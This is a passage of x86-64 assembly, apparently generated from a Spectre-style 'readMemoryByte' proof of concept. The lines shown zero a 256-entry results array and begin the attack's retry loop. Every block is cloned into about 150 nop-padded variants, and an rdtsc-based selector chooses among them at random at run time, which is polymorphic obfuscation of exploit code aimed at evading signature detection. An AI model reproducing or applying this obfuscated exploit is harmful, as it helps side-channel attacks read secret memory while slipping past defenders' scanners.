	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 113
.LreadMemoryByte_win9_var113:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 114
.LreadMemoryByte_win9_var114:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 115
.LreadMemoryByte_win9_var115:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 116
.LreadMemoryByte_win9_var116:
	popq	%rax
	nop
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 117
.LreadMemoryByte_win9_var117:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 118
.LreadMemoryByte_win9_var118:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 119
.LreadMemoryByte_win9_var119:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 120
.LreadMemoryByte_win9_var120:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 121
.LreadMemoryByte_win9_var121:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 122
.LreadMemoryByte_win9_var122:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 123
.LreadMemoryByte_win9_var123:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 124
.LreadMemoryByte_win9_var124:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 125
.LreadMemoryByte_win9_var125:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 126
.LreadMemoryByte_win9_var126:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 127
.LreadMemoryByte_win9_var127:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 128
.LreadMemoryByte_win9_var128:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 129
.LreadMemoryByte_win9_var129:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 130
.LreadMemoryByte_win9_var130:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 131
.LreadMemoryByte_win9_var131:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 132
.LreadMemoryByte_win9_var132:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 133
.LreadMemoryByte_win9_var133:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 134
.LreadMemoryByte_win9_var134:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 135
.LreadMemoryByte_win9_var135:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 136
.LreadMemoryByte_win9_var136:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 137
.LreadMemoryByte_win9_var137:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 138
.LreadMemoryByte_win9_var138:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 139
.LreadMemoryByte_win9_var139:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 140
.LreadMemoryByte_win9_var140:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 141
.LreadMemoryByte_win9_var141:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 142
.LreadMemoryByte_win9_var142:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 143
.LreadMemoryByte_win9_var143:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 144
.LreadMemoryByte_win9_var144:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 145
.LreadMemoryByte_win9_var145:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win9_continue
## Variant 146
.LreadMemoryByte_win9_var146:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 147
.LreadMemoryByte_win9_var147:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 148
.LreadMemoryByte_win9_var148:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
	nop
	nop
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
## Variant 149
.LreadMemoryByte_win9_var149:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_4
## %bb.2:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	$0, (%rax,%rcx,4)
	nop
## %bb.3:                               ##   in Loop: Header=BB1_1 Depth=1
	nop
	movl	-56(%rbp), %eax
	jmp	.LreadMemoryByte_win9_continue
.LreadMemoryByte_win9_continue:
	addl	$1, %eax
	movl	%eax, -56(%rbp)
	jmp	LBB1_1
LBB1_4:
	movl	$1999, -52(%rbp)    # # imm = 0x7CF
LBB1_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB1_7 Depth 2
                                        ##     Child Loop BB1_11 Depth 2
                                        ##       Child Loop BB1_13 Depth 3
                                        ##     Child Loop BB1_19 Depth 2
                                        ##     Child Loop BB1_26 Depth 2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win8_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win8_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win8_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win8_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win8_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win8_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win8_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win8_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win8_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win8_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win8_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win8_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win8_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win8_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win8_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win8_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win8_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win8_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win8_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win8_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win8_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win8_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win8_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win8_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win8_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win8_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win8_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win8_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win8_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win8_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win8_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win8_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win8_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win8_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win8_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win8_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win8_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win8_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win8_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win8_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win8_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win8_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win8_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win8_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win8_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win8_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win8_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win8_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win8_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win8_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win8_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win8_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win8_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win8_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win8_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win8_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win8_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win8_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win8_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win8_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win8_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win8_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win8_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win8_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win8_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win8_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win8_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win8_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win8_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win8_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win8_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win8_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win8_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win8_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win8_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win8_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win8_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win8_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win8_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win8_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win8_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win8_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win8_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win8_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win8_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win8_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win8_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win8_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win8_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win8_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win8_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win8_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win8_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win8_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win8_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win8_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win8_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win8_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win8_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win8_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win8_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win8_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win8_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win8_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win8_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win8_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win8_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win8_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win8_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win8_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win8_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win8_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win8_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win8_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win8_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win8_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win8_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win8_var117
	cmpl	$118, %eax
	je	.LreadMemoryByte_win8_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win8_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win8_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win8_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win8_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win8_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win8_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win8_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win8_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win8_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win8_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win8_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win8_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win8_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win8_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win8_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win8_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win8_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win8_var136
	cmpl	$137, %eax
	je	.LreadMemoryByte_win8_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win8_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win8_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win8_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win8_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win8_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win8_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win8_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win8_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win8_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win8_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win8_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win8_var149
	jmp	.LreadMemoryByte_win8_var0
## Variant 0
.LreadMemoryByte_win8_var0:
	popq	%rax
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 1
.LreadMemoryByte_win8_var1:
	popq	%rax
	nop
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	nop
	movl	$0, -56(%rbp)
	jmp	.LreadMemoryByte_win8_continue
## Variant 2
.LreadMemoryByte_win8_var2:
	popq	%rax
	nop
	cmpl	$0, -52(%rbp)
	jle	LBB1_42
	nop
	nop
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
